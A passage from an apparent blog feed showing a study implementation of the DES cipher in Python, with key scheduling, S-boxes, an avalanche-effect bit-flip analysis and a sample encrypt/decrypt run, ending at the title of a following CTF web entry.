class="number">36</span>])</span><br><span class="line">        self.p_box_right = list_from_zero([<span class="number">63</span>,<span class="number">55</span>,<span class="number">47</span>,<span class="number">39</span>,<span class="number">31</span>,<span class="number">23</span>,<span class="number">15</span>,<span class="number">7</span>,<span class="number">62</span>,<span class="number">54</span>,<span class="number">46</span>,<span class="number">38</span>,<span class="number">30</span>,<span class="number">22</span>,<span class="number">14</span>,<span class="number">6</span>,<span class="number">61</span>,<span class="number">53</span>,<span class="number">45</span>,<span class="number">37</span>,<span class="number">29</span>,<span class="number">21</span>,<span class="number">13</span>,<span class="number">5</span>,<span class="number">28</span>,<span class="number">20</span>,<span class="number">12</span>,<span class="number">4</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        self.key_left = [self.key[i] <span class="keyword">for</span> i <span class="keyword">in</span> self.p_box_left]</span><br><span class="line">        self.key_right = [self.key[i] <span class="keyword">for</span> i <span class="keyword">in</span> self.p_box_right]</span><br><span class="line"></span><br><span class="line">        self.s=[[<span class="number">14</span>, <span class="number">4</span>, <span class="number">13</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">15</span>, <span class="number">11</span>, <span class="number">8</span>, <span class="number">3</span>, <span class="number">10</span>, <span class="number">6</span>, <span class="number">12</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">14</span>, <span class="number">2</span>, <span class="number">13</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">6</span>, <span class="number">12</span>, <span class="number">11</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">14</span>, <span class="number">8</span>, <span class="number">13</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">11</span>, <span class="number">15</span>, <span class="number">12</span>, <span class="number">9</span>, <span class="number">7</span>, <span class="number">3</span>, <span class="number">10</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">12</span>, <span class="number">8</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">11</span>, <span class="number">3</span>, <span class="number">14</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">13</span>]</span><br><span class="line">                ,[<span class="number">15</span>, <span class="number">1</span>, <span class="number">8</span>, <span class="number">14</span>, <span class="number">6</span>, <span class="number">11</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">13</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">10</span>, <span class="number">3</span>, <span class="number">13</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">15</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">14</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">11</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">10</span>, <span class="number">4</span>, <span class="number">13</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">8</span>, <span class="number">12</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">15</span>, <span class="number">13</span>, <span class="number">8</span>, <span class="number">10</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">15</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">11</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">14</span>, <span class="number">9</span>]</span><br><span class="line">                ,[<span class="number">10</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">14</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">15</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">13</span>, <span class="number">12</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">13</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">14</span>, <span class="number">12</span>, <span class="number">11</span>, <span class="number">15</span>, <span class="number">1</span>, <span class="number">13</span>, <span class="number">6</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">15</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">12</span>, <span class="number">5</span>, <span class="number">10</span>, <span class="number">14</span>, <span class="number">7</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">13</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">15</span>, <span class="number">14</span>, <span class="number">3</span>, <span class="number">11</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">12</span>]</span><br><span class="line">                ,[<span class="number">7</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">4</span>, <span class="number">15</span>, <span class="number">13</span>, <span class="number">8</span>, <span class="number">11</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">12</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">14</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">11</span>, <span class="number">7</span>, <span class="number">13</span>, <span class="number">15</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">14</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">1</span>, <span class="number">13</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">14</span>]</span><br><span class="line">                ,[<span class="number">2</span>, <span class="number">12</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">15</span>, <span class="number">13</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">9</span>, <span class="number">14</span>, <span class="number">11</span>, <span class="number">2</span>, <span class="number">12</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">13</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">10</span>, <span class="number">3</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">6</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">11</span>, <span class="number">10</span>, <span class="number">13</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">15</span>, <span class="number">9</span>, <span class="number">12</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">11</span>, <span class="number">8</span>, <span class="number">12</span>, <span class="number">7</span>, <span class="number">1</span>, <span class="number">14</span>, <span class="number">2</span>, <span class="number">13</span>, <span class="number">6</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">3</span>]</span><br><span class="line">                ,[<span class="number">12</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">9</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">13</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">14</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">11</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">7</span>, <span class="number">12</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">3</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">12</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">10</span>, <span class="number">1</span>, <span class="number">13</span>, <span class="number">11</span>, <span class="number">6</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">12</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">15</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">14</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">13</span>]</span><br><span class="line">                ,[<span class="number">4</span>, <span class="number">11</span>, <span class="number">2</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">13</span>, <span class="number">3</span>, <span class="number">12</span>, <span class="number">9</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">10</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">13</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">14</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">12</span>, <span class="number">2</span>, <span class="number">15</span>, <span class="number">8</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">12</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">14</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">8</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">10</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">14</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">12</span>]</span><br><span class="line">                ,[<span class="number">13</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">15</span>, <span class="number">11</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">9</span>, <span class="number">3</span>, <span class="number">14</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">7</span>, <span class="number">1</span>, <span class="number">15</span>, <span class="number">13</span>, <span class="number">8</span>, <span class="number">10</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">12</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">11</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">9</span>, <span class="number">2</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">9</span>, <span class="number">12</span>, <span class="number">14</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">13</span>, <span class="number">15</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">8</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">14</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">10</span>, <span class="number">8</span>, <span class="number">13</span>, <span class="number">15</span>, <span class="number">12</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">11</span>]]</span><br><span class="line"></span><br><span class="line">        self.p = list_from_zero([<span class="number">58</span>,<span class="number">50</span>,<span class="number">42</span>,<span class="number">34</span>,<span class="number">26</span>,<span class="number">18</span>,<span class="number">10</span>,<span class="number">2</span>,<span class="number">60</span>,<span class="number">52</span>,<span class="number">44</span>,<span class="number">36</span>,<span class="number">28</span>,<span class="number">20</span>,<span class="number">12</span>,<span class="number">4</span>,  </span><br><span class="line">                                <span class="number">62</span>,<span class="number">54</span>,<span class="number">46</span>,<span class="number">38</span>,<span class="number">30</span>,<span class="number">22</span>,<span class="number">14</span>,<span class="number">6</span>,<span class="number">64</span>,<span class="number">56</span>,<span class="number">48</span>,<span class="number">40</span>,<span class="number">32</span>,<span class="number">24</span>,<span class="number">16</span>,<span class="number">8</span>,  </span><br><span class="line">                                <span class="number">57</span>,<span class="number">49</span>,<span class="number">41</span>,<span class="number">33</span>,<span class="number">25</span>,<span class="number">17</span>,<span class="number">9</span>,<span class="number">1</span>,<span class="number">59</span>,<span class="number">51</span>,<span class="number">43</span>,<span class="number">35</span>,<span class="number">27</span>,<span class="number">19</span>,<span class="number">11</span>,<span class="number">3</span>,  </span><br><span class="line">                                <span class="number">61</span>,<span class="number">53</span>,<span class="number">45</span>,<span class="number">37</span>,<span class="number">29</span>,<span class="number">21</span>,<span class="number">13</span>,<span class="number">5</span>,<span class="number">63</span>,<span class="number">55</span>,<span class="number">47</span>,<span class="number">39</span>,<span class="number">31</span>,<span class="number">23</span>,<span class="number">15</span>,<span class="number">7</span>])</span><br><span class="line"></span><br><span class="line">        self.p_rev = list_from_zero([<span class="number">40</span>, <span class="number">8</span>, <span class="number">48</span>, <span class="number">16</span>, <span class="number">56</span>, <span class="number">24</span>, <span class="number">64</span>, <span class="number">32</span>, <span class="number">39</span>, <span class="number">7</span>, <span class="number">47</span>, <span class="number">15</span>, <span class="number">55</span>, <span class="number">23</span>, <span class="number">63</span>, <span class="number">31</span>,</span><br><span class="line">                                    <span class="number">38</span>, <span class="number">6</span>, <span class="number">46</span>, <span class="number">14</span>, <span class="number">54</span>, <span class="number">22</span>, <span class="number">62</span>, <span class="number">30</span>, <span class="number">37</span>, <span class="number">5</span>, <span class="number">45</span>, <span class="number">13</span>, <span class="number">53</span>, <span class="number">21</span>, <span class="number">61</span>, <span class="number">29</span>,</span><br><span class="line">                                    <span class="number">36</span>, <span class="number">4</span>, <span class="number">44</span>, <span class="number">12</span>, <span class="number">52</span>, <span class="number">20</span>, <span class="number">60</span>, <span class="number">28</span>, <span class="number">35</span>, <span class="number">3</span>, <span class="number">43</span>, <span class="number">11</span>, <span class="number">51</span>, <span class="number">19</span>, <span class="number">59</span>, <span class="number">27</span>,</span><br><span class="line">                                    <span class="number">34</span>, <span class="number">2</span>, <span class="number">42</span>, <span class="number">10</span>, <span class="number">50</span>, <span class="number">18</span>, <span class="number">58</span>, <span class="number">26</span>, <span class="number">33</span>, <span class="number">1</span>, <span class="number">41</span>,  <span class="number">9</span>, <span class="number">49</span>, <span class="number">17</span>, <span class="number">57</span>, <span class="number">25</span>])</span><br><span class="line"></span><br><span class="line">        self.roll_dict = &#123;<span class="number">1</span>:<span class="number">1</span>,<span class="number">2</span>:<span class="number">1</span>,<span class="number">3</span>:<span class="number">2</span>,<span class="number">4</span>:<span class="number">2</span>,<span class="number">5</span>:<span class="number">2</span>,<span class="number">6</span>:<span class="number">2</span>,<span class="number">7</span>:<span class="number">2</span>,<span class="number">8</span>:<span class="number">2</span>,<span class="number">9</span>:<span class="number">1</span>,<span class="number">10</span>:<span class="number">2</span>,<span class="number">11</span>:<span class="number">2</span>,<span class="number">12</span>:<span class="number">2</span>,<span class="number">13</span>:<span class="number">2</span>,<span class="number">14</span>:<span class="number">2</span>,<span class="number">15</span>:<span class="number">2</span>,<span class="number">16</span>:<span class="number">1</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        self.yasuo = list_from_zero([<span class="number">14</span>, <span class="number">17</span>, <span class="number">11</span>, <span class="number">24</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">28</span>, <span class="number">15</span>, <span class="number">6</span>, <span class="number">21</span>, <span class="number">10</span></span><br><span class="line">                                ,<span class="number">23</span>, <span class="number">19</span>, <span class="number">12</span>, <span class="number">4</span>, <span class="number">26</span>, <span class="number">8</span>, <span class="number">16</span>, <span class="number">7</span>, <span class="number">27</span>, <span class="number">20</span>, <span class="number">13</span>, <span class="number">2</span></span><br><span class="line">                                ,<span class="number">41</span>, <span class="number">52</span>, <span class="number">31</span>, <span class="number">37</span>, <span class="number">47</span>, <span class="number">55</span>, <span class="number">30</span>, <span class="number">40</span>, <span class="number">51</span>, <span class="number">45</span>, <span class="number">33</span>, <span class="number">48</span></span><br><span class="line">                                ,<span class="number">44</span>, <span class="number">49</span>, <span class="number">39</span>, <span class="number">56</span>, <span class="number">34</span>, <span class="number">53</span>, <span class="number">46</span>, <span class="number">42</span>, <span class="number">50</span>, <span class="number">36</span>, <span class="number">29</span>, <span class="number">32</span>])</span><br><span class="line"></span><br><span class="line">        self.p_box = list_from_zero([<span class="number">16</span>, <span class="number">7</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">29</span>, <span class="number">12</span>, <span class="number">28</span>, <span class="number">17</span>, <span class="number">1</span>, <span class="number">15</span>, <span class="number">23</span>, <span class="number">26</span>, <span class="number">5</span>, <span class="number">18</span>, <span class="number">31</span>, <span class="number">10</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">24</span>, <span class="number">14</span>, <span class="number">32</span>, <span class="number">27</span>, <span class="number">3</span>, <span class="number">9</span>, <span class="number">19</span>, <span class="number">13</span>, <span class="number">30</span>, <span class="number">6</span>, <span class="number">22</span>, <span class="number">11</span>, <span class="number">4</span>,  <span class="number">25</span>])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">IP_change</span>(<span class="params">self,plain</span>):</span><br><span class="line">        new_plain = [plain[i] <span class="keyword">for</span> i <span class="keyword">in</span> self.p]</span><br><span class="line">        <span class="keyword">return</span> new_plain</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">IP_rev</span>(<span class="params">self,cypher</span>):</span><br><span class="line">        new_cypher = [cypher[i] <span class="keyword">for</span> i <span class="keyword">in</span> self.p_rev]</span><br><span class="line">        <span class="keyword">return</span> new_cypher</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">key_gen</span>(<span class="params">self,times</span>):</span><br><span class="line">        roll_time = self.roll_dict[times]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(roll_time):</span><br><span class="line">            temp = self.key_left.pop(<span class="number">0</span>)</span><br><span class="line">            self.key_left.append(temp)</span><br><span class="line"></span><br><span class="line">            temp = self.key_right.pop(<span class="number">0</span>)</span><br><span class="line">            self.key_right.append(temp)</span><br><span class="line"></span><br><span class="line">        all_list = self.key_left+self.key_right</span><br><span class="line">        final = [all_list[i] <span class="keyword">for</span> i <span class="keyword">in</span> self.yasuo]</span><br><span class="line">        <span class="keyword">return</span> final</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">key_gen_decode</span>(<span class="params">self,times</span>):  </span><br><span class="line">        roll_time = self.roll_dict[<span class="number">17</span>-times]</span><br><span class="line"></span><br><span class="line">        all_list = self.key_left+self.key_right</span><br><span class="line">        final = [all_list[i] <span class="keyword">for</span> i <span class="keyword">in</span> self.yasuo]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(roll_time):</span><br><span class="line">            temp = self.key_left.pop(-<span class="number">1</span>)</span><br><span class="line">            self.key_left.insert(<span class="number">0</span>,temp)</span><br><span class="line"></span><br><span class="line">            temp = self.key_right.pop(-<span class="number">1</span>)</span><br><span class="line">            self.key_right.insert(<span class="number">0</span>,temp)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> final</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">E_box</span>(<span class="params">self,part</span>):</span><br><span class="line">        first_list = [part[i*<span class="number">4</span>:i*<span class="number">4</span>+<span class="number">4</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>)]</span><br><span class="line">        second_list = []</span><br><span class="line">        <span class="keyword">for</span> each <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(first_list)):</span><br><span class="line">            temp = first_list[each][:]</span><br><span class="line">            temp.insert(<span class="number">0</span>,first_list[(each-<span class="number">1</span>)%<span class="number">8</span>][-<span class="number">1</span>])</span><br><span class="line">            temp.append(first_list[(each+<span class="number">1</span>)%<span class="number">8</span>][<span class="number">0</span>])</span><br><span class="line">            second_list += temp</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> second_list</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">S_box</span>(<span class="params">self,part</span>):</span><br><span class="line">        group = [part[<span class="number">6</span>*i:<span class="number">6</span>*i+<span class="number">6</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>)]</span><br><span class="line">        final = []</span><br><span class="line">        i=<span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> each <span class="keyword">in</span> group:</span><br><span class="line">            row = each[<span class="number">0</span>]*<span class="number">2</span>+each[<span class="number">5</span>]</span><br><span class="line">            col = each[<span class="number">4</span>]+each[<span class="number">3</span>]*<span class="number">2</span>+each[<span class="number">2</span>]*<span class="number">4</span>+each[<span class="number">1</span>]*<span class="number">8</span></span><br><span class="line">            temp = padding(<span class="built_in">bin</span>(self.s[i][row*<span class="number">16</span>+col])[<span class="number">2</span>:],<span class="number">4</span>)</span><br><span class="line">            i+=<span class="number">1</span></span><br><span class="line">            <span class="keyword">for</span> one <span class="keyword">in</span> temp:</span><br><span class="line">                final.append(<span class="built_in">int</span>(one))</span><br><span class="line">        <span class="keyword">return</span> final</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">P_box</span>(<span class="params">self,part</span>):</span><br><span class="line">        final = [part[i] <span class="keyword">for</span> i <span class="keyword">in</span> self.p_box]</span><br><span class="line">        <span class="keyword">return</span> final</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">decode_64bits</span>(<span class="params">self,plain</span>):</span><br><span class="line">        ipchange = self.IP_change(plain)</span><br><span class="line">        L = ipchange[<span class="number">0</span>:<span class="number">32</span>]</span><br><span class="line">        R = ipchange[<span class="number">32</span>:]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">            extend = self.E_box(L[:])</span><br><span class="line">            key = self.key_gen_decode(i+<span class="number">1</span>)</span><br><span class="line">            after_xor = xor(extend,key)</span><br><span class="line">            after_s = self.S_box(after_xor)</span><br><span class="line">            after_p = self.P_box(after_s)</span><br><span class="line">            final = xor(R,after_p)</span><br><span class="line">            R=L[:]</span><br><span class="line">            L = final[:]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        res = <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">str</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> self.IP_rev(L+R)])</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">encode_64bits</span>(<span class="params">self,cypher</span>):</span><br><span class="line">        ipchange = self.IP_change(cypher)</span><br><span class="line">        L = ipchange[<span class="number">0</span>:<span class="number">32</span>]</span><br><span class="line">        R = ipchange[<span class="number">32</span>:]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">            temp = L[:]</span><br><span class="line">            L = R[:]</span><br><span class="line">            extend = self.E_box(R)</span><br><span class="line">            key = self.key_gen(i+<span class="number">1</span>)</span><br><span class="line">            after_xor = xor(extend,key)</span><br><span class="line">            after_s = self.S_box(after_xor)</span><br><span class="line">            after_p = self.P_box(after_s)</span><br><span class="line">            final = xor(temp,after_p)</span><br><span class="line">            R = final[:]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        res = <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">str</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> self.IP_rev(L+R)])</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">analyse</span>():</span><br><span class="line">    a=DES(<span class="string">&#x27;DeS_KeY!&#x27;</span>)</span><br><span class="line">    str1=<span class="string">&#x27;1000100101000100001101001000101110000101000000010001011100110000&#x27;</span></span><br><span class="line">    <span class="comment"># print(a.decode_64bits(&#x27;1&#x27;*64))</span></span><br><span class="line">    <span class="comment"># 1000100101000100001101001000101110000101000000010001011100110000</span></span><br><span class="line">    <span class="keyword">for</span> each <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(str1)):</span><br><span class="line">        new = <span class="built_in">list</span>(str1[:])</span><br><span class="line">        <span class="keyword">if</span> new[each]==<span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">            new[each]=<span class="string">&#x27;0&#x27;</span></span><br><span class="line">            new=<span class="string">&#x27;&#x27;</span>.join(new)</span><br><span class="line">            res = a.decode_64bits(new)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;第&quot;</span>+<span class="built_in">str</span>(each+<span class="number">1</span>)+<span class="string">&quot;位明文改变了密文的:第&quot;</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            <span class="keyword">for</span> sec <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(res)):</span><br><span class="line">                <span class="keyword">if</span> res[sec]==<span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="built_in">str</span>(sec+<span class="number">1</span>),end=<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;改变&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            new[each]=<span class="string">&#x27;1&#x27;</span></span><br><span class="line">            new=<span class="string">&#x27;&#x27;</span>.join(new)</span><br><span class="line">            res = a.decode_64bits(new)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;第&quot;</span>+<span class="built_in">str</span>(each+<span class="number">1</span>)+<span class="string">&quot;位明文改变了密文的:第&quot;</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            <span class="keyword">for</span> sec <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(res)):</span><br><span class="line">                <span class="keyword">if</span> res[sec]==<span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="built_in">str</span>(sec+<span class="number">1</span>),end=<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;改变&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment">#analyse()</span></span><br><span class="line">    a=DES(<span class="string">&#x27;DeS_KeY!&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;plain:&quot;</span>,<span class="string">&#x27;1101&#x27;</span>*<span class="number">16</span>)</span><br><span class="line">    temp = a.encode_64bits(<span class="string">&#x27;1101&#x27;</span>*<span class="number">16</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;cypher:&quot;</span>,temp)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;decode&quot;</span>,a.decode_64bits(temp))</span><br><span class="line"></span><br><span class="line"><span class="comment">#plain: 1101110111011101110111011101110111011101110111011101110111011101</span></span><br><span class="line"><span class="comment">#cypher: 0000001010110100101011010011011001100010110001101100000010101011</span></span><br><span class="line"><span class="comment">#decode 1101110111011101110111011101110111011101110111011101110111011101</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 密码学 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>N1ctf-web学习</title>
      <link href="/2018/03/14/n1ctf-web%E5%AD%A6%E4%B9%A0/"/>
      <url>/2018/03/14/n1ctf-web%E5%AD%A6%E4%B9%A0/</url>
      
